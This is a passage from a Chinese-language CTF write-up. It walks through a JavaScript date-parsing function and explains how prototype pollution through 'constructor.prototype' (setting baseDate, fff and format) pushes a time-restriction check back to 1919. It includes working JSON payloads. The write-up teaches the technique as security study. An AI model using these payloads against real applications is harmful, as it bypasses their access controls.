class_">MonthDay</span>(n1, n3)) &#123;</span><br><span class="line">                <span class="comment">// 12-31-2020</span></span><br><span class="line">                <span class="keyword">let</span> yyyy = <span class="title function_">pad</span>(n3, <span class="number">1</span>), <span class="variable constant_">MM</span> = <span class="title function_">pad</span>(n1, <span class="number">2</span>), dd = <span class="title function_">pad</span>(n2, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">return</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">getHMS</span> = (<span class="params">time</span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> regres = <span class="regexp">/^(\d+) *\: *(\d+)( *\: *(\d+)( *\. *(\d+))?)?$/</span>.<span class="title function_">exec</span>(time.<span class="title function_">trim</span>())</span><br><span class="line">            <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">            <span class="keyword">let</span> [n1, n2, n3, n4] = [regres[<span class="number">1</span>], regres[<span class="number">2</span>], regres[<span class="number">4</span>], regres[<span class="number">6</span>]].<span class="title function_">map</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="keyword">typeof</span> t === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title class_">Number</span>(t));</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> n3 === <span class="string">&quot;undefined&quot;</span>) n3 = <span class="number">0</span>; <span class="comment">// 23:59(:59)?</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt;= n1 &amp;&amp; n1 &lt;= <span class="number">23</span> &amp;&amp; <span class="number">0</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="number">59</span> &amp;&amp; <span class="number">0</span> &lt;= n3 &amp;&amp; n3 &lt;= <span class="number">59</span>) &#123;</span><br><span class="line">                <span class="comment">// 23:59:59(.999)?</span></span><br><span class="line">                <span class="keyword">let</span> <span class="variable constant_">HH</span> = <span class="title function_">pad</span>(n1, <span class="number">2</span>), mm = <span class="title function_">pad</span>(n2, <span class="number">2</span>), ss = <span class="title function_">pad</span>(n3, <span class="number">2</span>),</span><br><span class="line">                    fff = <span class="keyword">typeof</span> n4 === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title function_">pad</span>(n4, <span class="number">3</span>).<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">const</span> o = &#123; <span class="variable constant_">HH</span>, mm, ss &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">typeof</span> fff !== <span class="string">&quot;undefined&quot;</span>) o.<span class="property">fff</span> = fff;</span><br><span class="line">                <span class="keyword">return</span> o;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">escapeRegExp</span> = (<span class="params">str</span>) =&gt; str.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^$&#123;&#125;()|\[\]\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>); <span class="comment">// $&amp; means the whole matched string</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// format</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(opts.<span class="property">format</span>) &amp;&amp; opts.<span class="property">format</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> fmt <span class="keyword">of</span> opts.<span class="property">format</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> regExpr_specifier = escapeRegExp(fmt)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/yyyy/</span>, <span class="string">&quot;(y&#123;4&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/yy/</span>, <span class="string">&quot;(yy)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/MM/</span>, <span class="string">&quot;(MM)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/dd/</span>, <span class="string">&quot;(dd)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/HH/</span>, <span class="string">&quot;(HH)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/mm/</span>, <span class="string">&quot;(mm)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/ss/</span>, <span class="string">&quot;(ss)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/fff/</span>, <span class="string">&quot;(fff)&quot;</span>)</span><br><span class="line">                <span class="keyword">let</span> sortTable = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">`^<span class="subst">$&#123;regExpr_specifier&#125;</span>$`</span>).<span class="title function_">exec</span>(fmt).<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">const</span> regExpr = escapeRegExp(fmt)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/yyyy/</span>, <span class="string">&quot;(-?\\d+)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/yy/</span>, <span class="string">&quot;(-?\\d+)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/MM/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/dd/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/HH/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/mm/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/ss/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/fff/</span>, <span class="string">&quot;(\\d&#123;1,3&#125;)&quot;</span>)</span><br><span class="line">                <span class="keyword">let</span> regres = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">`^<span class="subst">$&#123;regExpr&#125;</span>$`</span>).<span class="title function_">exec</span>(str.<span class="title function_">trim</span>())</span><br><span class="line">                <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">const</span> dateObj = opts.<span class="property">baseDate</span></span><br><span class="line">                <span class="keyword">const</span> _UTC = opts.<span class="property">UTC</span> ? <span class="string">&quot;UTC&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">let</span> argTable = &#123;</span><br><span class="line">                    <span class="string">&quot;yyyy&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>FullYear`</span>](),</span><br><span class="line">                    <span class="string">&quot;MM&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Month`</span>]() + <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;dd&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Date`</span>](),</span><br><span class="line">                    <span class="string">&quot;HH&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Hours`</span>](),</span><br><span class="line">                    <span class="string">&quot;mm&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Minutes`</span>](),</span><br><span class="line">                    <span class="string">&quot;ss&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Seconds`</span>](),</span><br><span class="line">                    <span class="string">&quot;fff&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Milliseconds`</span>] ? dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Milliseconds`</span>]() : <span class="literal">undefined</span> <span class="comment">// due to system architecture</span></span><br><span class="line">                &#125;</span><br><span class="line">                sortTable.<span class="title function_">forEach</span>(<span class="function">(<span class="params">f, i</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (f == <span class="string">&quot;yy&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">let</span> year = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                        year = year &lt; <span class="number">100</span> ? (<span class="number">1900</span> + year) : year;</span><br><span class="line">                        <span class="keyword">return</span> argTable[<span class="string">&quot;yyyy&quot;</span>] = year;</span><br><span class="line">                    &#125;</span><br><span class="line">                    argTable[f] = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                &#125;)</span><br><span class="line">                <span class="keyword">let</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd, <span class="variable constant_">HH</span>, mm, ss, fff &#125; = argTable;</span><br><span class="line"></span><br><span class="line">                [yyyy, <span class="variable constant_">MM</span>, dd, <span class="variable constant_">HH</span>, mm, ss, fff] = [<span class="title function_">pad</span>(yyyy, <span class="number">1</span>), <span class="title function_">pad</span>(<span class="variable constant_">MM</span>, <span class="number">2</span>), <span class="title function_">pad</span>(dd, <span class="number">2</span>), <span class="title function_">pad</span>(<span class="variable constant_">HH</span>, <span class="number">2</span>), <span class="title function_">pad</span>(mm, <span class="number">2</span>), <span class="title function_">pad</span>(ss, <span class="number">2</span>), <span class="keyword">typeof</span> fff === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title function_">pad</span>(fff, <span class="number">3</span>)];</span><br><span class="line">                <span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`<span class="subst">$&#123;yyyy&#125;</span>-<span class="subst">$&#123;MM&#125;</span>-<span class="subst">$&#123;dd&#125;</span>T<span class="subst">$&#123;HH&#125;</span>:<span class="subst">$&#123;mm&#125;</span>:<span class="subst">$&#123;ss&#125;</span>`</span> + (<span class="keyword">typeof</span> argTable.<span class="property">fff</span> === <span class="string">&quot;number&quot;</span> ? <span class="string">`.<span class="subst">$&#123;fff&#125;</span>`</span> : <span class="string">&quot;&quot;</span>) + (opts.<span class="property">UTC</span> ? <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isSafeInteger</span>(d.<span class="title function_">getTime</span>())) <span class="keyword">return</span> d;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Following: fallback to automatic detection</span></span><br><span class="line">        <span class="comment">// date or date time</span></span><br><span class="line">        <span class="keyword">let</span> date_time, delimiter = <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (str.<span class="title function_">includes</span>(<span class="string">&quot;T&quot;</span>)) &#123; <span class="comment">// T</span></span><br><span class="line">            <span class="keyword">let</span> delimiter_pos = str.<span class="title function_">indexOf</span>(<span class="string">&quot;T&quot;</span>);</span><br><span class="line">            delimiter = <span class="string">&quot;T&quot;</span>;</span><br><span class="line">            date_time = [str.<span class="title function_">substring</span>(<span class="number">0</span>, delimiter_pos), str.<span class="title function_">substring</span>(delimiter_pos + <span class="number">1</span>)];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// space</span></span><br><span class="line">            <span class="keyword">let</span> subdeli_pos1 = str.<span class="title function_">indexOf</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">            <span class="keyword">let</span> subdeli_pos2 = str.<span class="title function_">indexOf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (subdeli_pos2 === -<span class="number">1</span>) subdeli_pos2 = str.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (subdeli_pos1 === -<span class="number">1</span> || subdeli_pos2 === -<span class="number">1</span>) date_time = [str];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> subdeli_pos = <span class="title class_">Math</span>.<span class="title function_">max</span>(subdeli_pos1, subdeli_pos2);</span><br><span class="line">                <span class="keyword">let</span> meetNumber = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">while</span> (--subdeli_pos) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\d/</span>.<span class="title function_">test</span>(str[subdeli_pos])) meetNumber = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">if</span> (meetNumber &amp;&amp; str[subdeli_pos].<span class="title function_">trim</span>() === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                        delimiter = str[subdeli_pos];</span><br><span class="line">                        date_time = [str.<span class="title function_">substring</span>(<span class="number">0</span>, subdeli_pos), str.<span class="title function_">substring</span>(subdeli_pos)];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!meetNumber) date_time = [str];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (date_time.<span class="property">length</span> === <span class="number">1</span>) &#123; <span class="comment">// only date</span></span><br><span class="line">            <span class="keyword">const</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125; = <span class="title function_">getYMD</span>(date_time[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> yyyy === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> <span class="variable constant_">MM</span> === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> dd === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`<span class="subst">$&#123;yyyy&#125;</span>-<span class="subst">$&#123;MM&#125;</span>-<span class="subst">$&#123;dd&#125;</span>T00:00:00`</span> + (opts.<span class="property">UTC</span> ? <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// date and time</span></span><br><span class="line">            <span class="keyword">const</span> s1 = date_time[<span class="number">0</span>].<span class="title function_">trim</span>(), s2 = date_time[<span class="number">1</span>].<span class="title function_">trim</span>();</span><br><span class="line">            <span class="keyword">let</span> date_str, time_str, <span class="variable constant_">UTC</span> = opts.<span class="property">UTC</span>;</span><br><span class="line">            <span class="keyword">if</span> (delimiter === <span class="string">&quot;T&quot;</span>) &#123; <span class="comment">// T</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s1)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">                <span class="variable constant_">UTC</span> = <span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s2);</span><br><span class="line">                date_str = s1, time_str = s2.<span class="title function_">slice</span>(-<span class="number">1</span>) === <span class="string">&quot;Z&quot;</span> ? s2.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>) : s2;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// space</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s1) || <span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s2)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (s1.<span class="title function_">includes</span>(<span class="string">&quot;:&quot;</span>)) date_str = s2, time_str = s1;</span><br><span class="line">                <span class="keyword">else</span> date_str = s1, time_str = s2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125; = <span class="title function_">getYMD</span>(date_str)</span><br><span class="line">            <span class="keyword">const</span> &#123; <span class="variable constant_">HH</span>, mm, ss, fff &#125; = <span class="title function_">getHMS</span>(time_str)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> yyyy === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> <span class="variable constant_">MM</span> === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> dd === <span class="string">&quot;string&quot;</span> &amp;&amp;</span><br><span class="line">                <span class="keyword">typeof</span> <span class="variable constant_">HH</span> === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> mm === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> ss === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`<span class="subst">$&#123;yyyy&#125;</span>-<span class="subst">$&#123;MM&#125;</span>-<span class="subst">$&#123;dd&#125;</span>T<span class="subst">$&#123;HH&#125;</span>:<span class="subst">$&#123;mm&#125;</span>:<span class="subst">$&#123;ss&#125;</span>`</span> + (<span class="keyword">typeof</span> fff === <span class="string">&quot;string&quot;</span> ? <span class="string">`.<span class="subst">$&#123;fff&#125;</span>`</span> : <span class="string">&quot;&quot;</span>) + (<span class="variable constant_">UTC</span> ? <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到createDate函数能够接受两个参数，如果没有传入opts参数，那么直接返回，没有可操作的地方，因此在gitInfo函数中，如果createDate函数的返回值没问题，那么全剧终，利用不了一点，但是如果有问题的话，就会调用catch中的代码，此时是会传入一个opts参数的，因此，第一个目标就是要让createDate函数的返回值出错。</p>
<p>继续往下看，因为我们传入的opts参数中没有format属性，因此下面代码很明显是可以原型链污染控制opts.format的值的</p>
<p>  opts.format &#x3D; opts.format.filter(f &#x3D;&gt; typeof f &#x3D;&#x3D;&#x3D; “string”)</p>
<p>而对于baseDate，由于DEFAULT_CREATE_DATE_OPTIONS中本身不含baseDate，可直接触发该原型链</p>
<p> opts.baseDate &#x3D; new Date(opts.baseDate || Date.now());</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">createDate</span> = (<span class="params">str, opts</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">CopiedDefaultOptions</span> = <span class="title function_">copyJSON</span>(<span class="variable constant_">DEFAULT_CREATE_DATE_OPTIONS</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts === <span class="string">&quot;undefined&quot;</span>) opts = <span class="title class_">CopiedDefaultOptions</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts !== <span class="string">&quot;object&quot;</span>) opts = &#123; ...<span class="title class_">CopiedDefaultOptions</span>, <span class="attr">UTC</span>: <span class="title class_">Boolean</span>(opts) &#125;;</span><br><span class="line">    opts.<span class="property">UTC</span> = <span class="keyword">typeof</span> opts.<span class="property">UTC</span> === <span class="string">&quot;undefined&quot;</span> ? <span class="title class_">CopiedDefaultOptions</span>.<span class="property">UTC</span> : <span class="title class_">Boolean</span>(opts.<span class="property">UTC</span>);</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span> || <span class="title class_">CopiedDefaultOptions</span>.<span class="property">format</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(opts.<span class="property">format</span>)) opts.<span class="property">format</span> = [opts.<span class="property">format</span>]</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> <span class="keyword">typeof</span> f === <span class="string">&quot;string&quot;</span>)</span><br><span class="line">        .<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="regexp">/yy|yyyy|MM|dd|HH|mm|ss|fff/</span>.<span class="title function_">test</span>(f) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`At least one format specifier is required.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">`|<span class="subst">$&#123;f&#125;</span>|`</span>.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;yy&quot;</span>).<span class="title function_">split</span>(<span class="regexp">/yy|MM|dd|HH|mm|ss|fff/</span>).<span class="title function_">includes</span>(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`Delimeters are required between format specifiers.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f.<span class="title function_">includes</span>(<span class="string">&quot;yyyy&quot;</span>) &amp;&amp; f.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">includes</span>(<span class="string">&quot;yy&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`&quot;yyyy&quot; and &quot;yy&quot; cannot be used together.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">    opts.<span class="property">baseDate</span> = <span class="keyword">new</span> <span class="title class_">Date</span>(opts.<span class="property">baseDate</span> || <span class="title class_">Date</span>.<span class="title function_">now</span>());</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getHMS</span> = (<span class="params">time</span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> regres = <span class="regexp">/^(\d+) *\: *(\d+)( *\: *(\d+)( *\. *(\d+))?)?$/</span>.<span class="title function_">exec</span>(time.<span class="title function_">trim</span>())</span><br><span class="line">            <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">            <span class="keyword">let</span> [n1, n2, n3, n4] = [regres[<span class="number">1</span>], regres[<span class="number">2</span>], regres[<span class="number">4</span>], regres[<span class="number">6</span>]].<span class="title function_">map</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="keyword">typeof</span> t === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title class_">Number</span>(t));</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> n3 === <span class="string">&quot;undefined&quot;</span>) n3 = <span class="number">0</span>; <span class="comment">// 23:59(:59)?</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt;= n1 &amp;&amp; n1 &lt;= <span class="number">23</span> &amp;&amp; <span class="number">0</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="number">59</span> &amp;&amp; <span class="number">0</span> &lt;= n3 &amp;&amp; n3 &lt;= <span class="number">59</span>) &#123;</span><br><span class="line">                <span class="comment">// 23:59:59(.999)?</span></span><br><span class="line">                <span class="keyword">let</span> <span class="variable constant_">HH</span> = <span class="title function_">pad</span>(n1, <span class="number">2</span>), mm = <span class="title function_">pad</span>(n2, <span class="number">2</span>), ss = <span class="title function_">pad</span>(n3, <span class="number">2</span>),</span><br><span class="line">                    fff = <span class="keyword">typeof</span> n4 === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title function_">pad</span>(n4, <span class="number">3</span>).<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">const</span> o = &#123; <span class="variable constant_">HH</span>, mm, ss &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">typeof</span> fff !== <span class="string">&quot;undefined&quot;</span>) o.<span class="property">fff</span> = fff;</span><br><span class="line">                <span class="keyword">return</span> o;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>大致意思是将传入的时间先分开成时、分、秒、毫秒，n1&#x3D;regres[1]&#x3D;时，n2&#x3D;regres[2]&#x3D;分，n3&#x3D;regres[3]&#x3D;秒，n4&#x3D;regres[4]&#x3D;毫秒，当传入的时间中没有毫秒，最后返回的对象也不会有fff属性。在后面注释fallback to automatic detection的部分，有这样的代码，因此如果getHMS函数返回的对象不存在fff属性，就能触发原型链污染。</p>
<p>const { HH, mm, ss, fff } &#x3D; getHMS(time_str)</p>
<p>首先考虑如何让createData函数的返回值无效，观察函数的代码，我们发现能够返回的地方有两个，一个实在format模式下，一个是在fallback to automatic detection模式下（先执行format），先看format</p>
<p>if (Number.isSafeInteger(d.getTime())) return d;</p>
<p>从上面代码可以看出想要返回无效值是不可能的，因此我们需要想办法绕过format，根据wp可知此处只需要污染basedata即可绕过，同时format函数中还有一段较为关键的代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sortTable.<span class="title function_">forEach</span>(<span class="function">(<span class="params">f, i</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (f == <span class="string">&quot;yy&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">let</span> year = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                        year = year &lt; <span class="number">100</span> ? (<span class="number">1900</span> + year) : year;</span><br><span class="line">                        <span class="keyword">return</span> argTable[<span class="string">&quot;yyyy&quot;</span>] = year;</span><br><span class="line">                    &#125;</span><br><span class="line">                    argTable[f] = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                &#125;)</span><br></pre></td></tr></table></figure>

<p>表示支持yy标识符，当年份小于100时，我们认为是20世纪的年份</p>
<p>举例来说，如果<code>format</code>为<code>20yy-MM-dd</code>，在<code>format</code>解析字符串<code>2023-10-01</code>时，将解析<code>yy</code>为<code>23</code>，输出输出为<code>1923</code>，最终输出的年份是<code>1923-10-01，这一点可以帮助我们获取很早时间的数据。</code></p>
<p>触发catch的条件是前面try的createDate返回一个无效的日期，或者createDate本身被调用时法神错误</p>
<p>目标：触发<code>createDate</code>错误，或使<code>createDate</code>返回无效日期</p>
<p>最后再看fallback to automatic detection模式，当fff为string时直接返回，结合上文我们可以污染fff为无效的字符，使最后的返回时间无效，执行最开头catch中的内容，此时取得是DEFAULT_CONFIG.min_public_time，也就是min_public_time: “2019-07-08T16:00:00.000Z”，结合之前讲的yy标识符，我们只需要污染format为：yy19-MM-ddTHH:mm:ss.fffZ</p>
<p>就能将返回时间改成1919-07-08T16:00:00.000Z.</p>
<p>也就是说污染<code>baseDate</code>为无效日期即可绕过 format 模式进入 Fallback Auto Detection</p>
<p><code>routes/info.js</code>的<code>try</code>中用的是<code>config.js</code>中的<code>min_pulic_time</code>，为<code>2019-07-09 00:00:00</code>，不带有毫秒，刚好能够触发<code>fff</code>的原型链污染，为<code>fff</code>指定为无效值即可</p>
<p>到此为止，使用如下的 payload 可以触发<code>catch</code></p>
<p>{</p>
<p>  “contact”:”1”, “reason”:”2”,</p>
<p>  “constructor”:{</p>
<p>​    “prototype”:{</p>
<p>​      “baseDate”:”aaa”,</p>
<p>​      “fff”: “bbb”</p>
<p>​    }</p>
<p>  }</p>
<p>}</p>
<p>进入<code>catch</code>后，达到了污染<code>format</code>的条件，但是<code>createDate</code>的参数变成了<code>config.default.js</code>中的<code>min_public_time</code>，为<code>2019-07-08T16:00:00.000Z</code>，因此可以构造<code>format</code>为<code>yy19-MM-ddTHH:mm:ss.fffZ</code></p>
<p>然后基于<code>format</code>的日期匹配会返回<code>1919-07-08T16:00:00.000Z</code>的日期，已经将<code>minTimestamp</code>提早了近一个世纪了</p>
<p>因此最终的<code>payload</code>为</p>
<p>{<br>    “contact”:”a”, “reason”:”a”,<br>    “constructor”:{<br>        “prototype”:{<br>            “format”: “yy19-MM-ddTHH:mm:ss.fffZ”,<br>            “baseDate”:”aaa”,<br>            “fff”: “bbb”<br>        }<br>    }<br>}</p>
<p>污染database和fff来绕过format模式——》</p>
<p>污染format模板使他可以以yy模式匹配min_public_time: “2019-07-08T16:00:00.000Z”——》</p>
<p>所以</p>
